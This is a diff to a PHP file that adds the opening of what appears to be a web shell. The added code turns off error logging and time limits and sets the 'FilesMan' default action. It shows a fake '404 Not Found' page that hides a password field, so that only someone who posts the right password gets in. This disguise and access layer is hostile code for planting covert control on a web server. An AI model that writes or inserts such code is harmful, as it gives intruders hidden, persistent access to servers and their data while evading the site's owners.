@@ -1,4 +1,37 @@
-<?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
+<?php 
+header("X-XSS-Protection: 0");
+ob_start();
+error_reporting(0);
+
+session_start();
+@set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', FALSE);
+
+/* Configuration */
+/* Password using md5 hashes */
+$password = "a18f218b13bca5e5e33c3934af193d41";
+$default_action = "FilesMan";
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+date_default_timezone_set("Asia/Jakarta");
+function login_shell() {
+    $SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
+    $Eform='<form method="post"><input style="margin:0;background-color:#fff;border:0px solid #fff;" type="password" name="password"></form>';
+    echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
+    exit;
+}
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    } else {
+        login_shell();
+    }
+}
 
 
 $Array = [
